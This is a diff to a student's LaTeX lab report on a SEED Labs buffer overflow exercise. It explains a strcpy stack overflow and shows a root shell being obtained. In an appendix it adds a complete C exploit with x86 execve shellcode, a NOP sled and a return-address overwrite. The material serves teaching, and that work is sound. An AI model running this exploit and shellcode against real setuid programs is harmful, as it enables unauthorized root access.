@@ -437,11 +437,67 @@ Option can be:
 
 \section{Buffer overflow}
 
-\lipsum[3]
+In our next lab assignment described at \url{http://www.cis.syr.edu/~wedu/seed/Labs/Vulnerability/Buffer_Overflow/} we were to exploit buffer overflow vulnerability in a given example program.
+
+The vulnerable code we were given, was reading input from a file called \texttt{badfile} and calling a \texttt{bof(...)} method shown in~\ref{bof1} that contained the vulnerability.
+
+\vspace{1em}
+\lstset{
+	captionpos=b,
+	frame=single,
+	language=C,
+	breaklines=true,
+	caption=Function with buffer overflow vulnerability,
+	label=bof1,
+}
+\begin{lstlisting}
+int bof(char *str)
+{
+	char buffer[12];
+
+	/* The following statement has a buffer overflow problem */ 
+	strcpy(buffer, str);
+
+	return 1;
+}
+\end{lstlisting}
+In the vulnerable program, a buffer that is 517 bytes in size is passed to the method \texttt{bof} and then the method copies the entire buffer into a variable \texttt{buffer}, which is likely overflow the buffer and thus overwrite the content of the stack.
 
 \subsubsection{Exploiting the Vulnerability}
 
-\lipsum[2]
+Our first task was to try to exploit the vulnerability and gain root access to the machine. We could assume that the vulnerable program in \emph{Set-root-UID} mode. Moreover we could assume that it is compiled with a flag that disables stack protection (\texttt{-fno-stack-protector})~\cite{gnu13} and that virtual address space randomization is off.
+
+The idea for exploiting such a vulnerability is to make the program run a command that the original developer did not intend. In order to force executing some command, we need to inject some code into the running program using a shellcode. 
+
+The shellcode is set of encoded instructions of a program that calls \texttt{system("/bin/sh")} system call. Because the program is run with \emph{Set-UID} 0, we would get root access to once \texttt{/bin/sh} is executed. In our lab set up, symbolic link \texttt{system("/bin/sh")} points to \texttt{zsh} rather than \texttt{bash}.
+
+Once the vulnerable program reads the shellcode from the input file into a buffer, it copies the buffer to some place on the stack in the \texttt{bof} method because the \texttt{strcpy} does not check the boundaries of the buffers. This way we can place the in the program being executed with root permission.
+
+It is not enough, however, to inject the shellcode, because when the program finishes executing \texttt{bof} method, it returns (or at least attempts to return) to \texttt{main} method. The program might crash at this point and this is because there is a return address on the stack and we might overwrite it.
+
+So, our goal is to modify the return address in such a way, so that the program carries on execution not back in \texttt{main} method, but on the stack where our malicious shell code is. We copied the code of vulnerable program and examined the stack with GDB. We quickly discovered, that we could obviously ignore first 12 bytes, then we could ignore value of ebp register and what next four bytes was stored return address. Our exploit's code is shown in~\ref{bof:exploit1}. 
+
+We discovered where we want to put our address that we will make \texttt{bof} method jump to upon returning from the function, however we now had to think what the address to write there. Because virtual space randomization is turned off, we could use the value of \text{buffer} array in the exploit as a reference. By trial and error we discovered that the the stack point points a bit further in the vulnerable program when executing the string copy method, therefore we hard coded a value by which we need to increase desired address. Also, most of the buffer is pre-filled with \texttt{NOP} instructions to which we jump on the stack, and then after executing many \texttt{NOP}s we reach our mallicious code and we can get root access as shown below in Listing~\ref{bof:root1}.
+\vspace{1em}
+\lstset{
+	captionpos=b,
+	frame=single,
+	language=BASH,
+	breaklines=true,
+	caption=Function with buffer overflow vulnerability,
+	label=bof:root1,
+}
+\begin{lstlisting}
+seed@seed-desktop:~/buffer$ ./exploit 
+Size of shellcode: 25
+Using Stack pointer at address: bffff324
+Buffer size: 517, shell code size: 25
+I will start writing to bffff50f
+seed@seed-desktop:~/buffer$ ./stack 
+# whoami                                                                       
+root
+# 
+\end{lstlisting}
 
 
 \subsubsection{Protection in /bin/bash}
@@ -461,7 +517,8 @@ Option can be:
 
 \section{Conclusions}
 
-\section{References?}
+\bibliographystyle{plain}
+\bibliography{ref}
 
 \newpage
 \begin{appendices}
@@ -539,6 +596,90 @@ void print_current() {
   return;
 }
 \end{lstlisting}
+
+
+\section{Buffer overflow exploits}
+\lstset{
+	captionpos=b,
+	frame=single,
+	language=C,
+	breaklines=true,
+	caption=Exploit for getting root with zsh,
+	label=bof:exploit1
+}
+\begin{lstlisting}
+/* exploit.c  */
+
+/* A program that creates a file containing code for launching shell*/
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+char shellcode[]=
+"\x31\xc0"      /* xorl  %eax,%eax   */
+"\x50"          /* pushl %eax        */
+"\x68""//sh"    /* pushl $0x68732f2f */
+"\x68""/bin"    /* pushl $0x6e69622f */
+"\x89\xe3"      /* movl  %esp,%ebx   */
+"\x50"          /* pushl %eax        */
+"\x53"          /* pushl %ebx        */
+"\x89\xe1"      /* movl  %esp,%ecx   */
+"\x99"          /* cdql              */
+"\xb0\x0b"      /* movb  $0x0b,%al   */
+"\xcd\x80"      /* int   $0x80       */
+;
+
+void main(int argc, char **argv)
+{  
+	char buffer[517];
+	FILE *badfile;
+	long fcP;
+	int buffer_size, shell_code_size;
+	
+	buffer_size = sizeof(buffer);
+	shell_code_size = sizeof(shellcode);
+	
+	/* Initialize buffer with 0x90 (NOP instruction) */
+	memset(&buffer, 0x90, 517);
+	
+	/* You need to fill the buffer with appropriate contents here */
+	printf("Size of shellcode: %d\n", sizeof(shellcode));
+	
+	/* Print stack pointer */
+	fcP = &buffer;
+	
+	/* Make sure is multiple of 4 */ 
+	while(fcP % 4 != 0) {
+	fcP += 1;
+	}
+	
+	printf ("Using Stack pointer at address: %x\n", fcP);
+	printf ("Buffer size: %d, shell code size: %d\n", buffer_size, shell_code_size);
+	
+	/* Compute how far we can palce shell code, we want it towards the end of buffer */
+	long address_to_copy_to = fcP + buffer_size - 1 - shell_code_size;
+	printf ("I will start writing to %08x\n", address_to_copy_to);
+	
+	/* We use address of buffer as reference, but we want to jump a bit more into the stack,
+	yet not too far */
+	fcP += 80;
+	
+	/* Place the address we want to in a position 
+	that would overwrite return address (16 bytes into stack) */
+	long addr = fcP;
+	long *ptr = (long*)(buffer + 16);
+	*(ptr) = addr;
+	
+	/* Copy shellcode */
+	memcpy(address_to_copy_to, shellcode, shell_code_size);
+	
+	/* Save the contents to the file "badfile" */
+	badfile = fopen("./badfile", "w");
+	fwrite(buffer, 517, 1, badfile);
+	fclose(badfile);
+}
+\end{lstlisting}
+
 \end{appendices}
 
 \end{document}
